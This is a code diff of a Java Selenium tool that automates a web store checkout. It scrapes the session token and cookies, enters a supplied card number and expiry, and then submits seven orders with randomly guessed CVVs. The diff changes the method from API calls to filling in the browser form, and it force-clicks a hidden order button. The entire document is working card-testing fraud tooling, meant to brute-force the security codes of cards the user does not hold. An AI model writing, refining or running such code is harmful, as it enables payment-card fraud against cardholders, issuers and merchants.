@@ -106,15 +106,18 @@ public class RealTimeSeleniumProcessor {
     driver.findElement(By.id("phone_number")).sendKeys(RandomBillingInfo.randomPhone());
     driver.findElement(By.id("email")).sendKeys(RandomBillingInfo.randomEmail());
 
+ // Extract and store _dynSessConf token
     String html = driver.getPageSource();
     dynSessionConf = org.jsoup.Jsoup.parse(html).select("input[name=_dynSessConf]").val();
 
+    // Extract cookies into a single string
     Set<Cookie> cookies = driver.manage().getCookies();
     StringBuilder cookieBuilder = new StringBuilder();
     for (Cookie cookie : cookies) {
         cookieBuilder.append(cookie.getName()).append("=").append(cookie.getValue()).append("; ");
     }
     browserCookies = cookieBuilder.toString();
+
     // Final Step: Preload completed
     System.out.println("✅ Pre-Load is Ready");
 } catch (Exception e) {
@@ -124,39 +127,55 @@ public class RealTimeSeleniumProcessor {
 }
     public static String processFetsLuckCard(String cardNumber, String expMonth, String expYear, String userCVV) {
         try {
-            int cvvLength = userCVV.length();
-            if (cvvLength != 3 && cvvLength != 4) {
-                return "❌ Invalid CVV length provided. It must be 3 or 4 digits.";
-            }
+            WebDriverWait localWait = new WebDriverWait(driver, Duration.ofSeconds(10));
 
-            // Convert month number to Jan, Feb, etc.
-            String[] monthNames = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
+            // Convert month to full name
+            String[] monthNames = {
+                "Jan", "Feb", "Mar", "Apr", "May", "Jun",
+                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
+            };
             int monthIndex = Integer.parseInt(expMonth) - 1;
-            if (monthIndex < 0 || monthIndex >= 12) return "❌ Invalid expiration month.";
-            String monthAbbr = monthNames[monthIndex];
+            if (monthIndex < 0 || monthIndex > 11) return "❌ Invalid expiration month.";
+            String monthName = monthNames[monthIndex];
 
             // Convert year to 4-digit
             String fullYear = expYear.length() == 2 ? "20" + expYear : expYear;
+                // Fill Card Number
+                WebElement ccNumber = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_number")));
+                ccNumber.clear();
+                ccNumber.sendKeys(cardNumber);
 
-            for (int i = 1; i <= 7; i++) {
-                String randomCVV = generateRandomCVV(cvvLength);
-                String result = PlaceOrderApiClient.submitPlaceOrderApi(cardNumber, monthAbbr, fullYear, randomCVV, browserCookies, dynSessionConf);
-                System.out.println("Attempt " + i + ": " + result);
-                Thread.sleep(700);
+                // Select Expiration Month
+                Select monthDropdown = new Select(localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_month"))));
+                monthDropdown.selectByVisibleText(monthName);
+
+                // Select Expiration Year
+                Select yearDropdown = new Select(localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_year"))));
+                yearDropdown.selectByVisibleText(fullYear);
+                for (int attempt = 1; attempt <= 7; attempt++) {
+                // Generate random CVV matching length of user input
+                int cvvLength = userCVV.length();
+                String randomCVV;
+                if (cvvLength == 4) {
+                    randomCVV = String.valueOf(1000 + new Random().nextInt(9000));
+                } else {
+                    randomCVV = String.valueOf(100 + new Random().nextInt(900));
+                }
+
+                // Enter CVV
+                WebElement cvvField = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cvv_number")));
+                cvvField.clear();
+                cvvField.sendKeys(randomCVV);
+
+                // Click PLACE ORDER (force click hidden submit)
+                WebElement placeOrderBtn = driver.findElement(By.id("billingReviewBtnDefault"));
+                ((JavascriptExecutor) driver).executeScript("arguments[0].click();", placeOrderBtn);
             }
-
             driver.quit();
-            return "✅ 7 CVV attempts submitted via API successfully.";
+            return "❌ 7 random CVV attempts failed. Card was declined.";
 
         } catch (Exception e) {
-            driver.quit();
-            return "❌ Failed to complete API-based payment attempts: " + e.getMessage();
+            return "❌ Error during fetsluck processing: " + e.getMessage();
         }
-    }
-
-    private static String generateRandomCVV(int length) {
-        int min = (int) Math.pow(10, length - 1);
-        int max = (int) Math.pow(10, length) - 1;
-        return String.valueOf(min + new Random().nextInt(max - min));
     }
 }
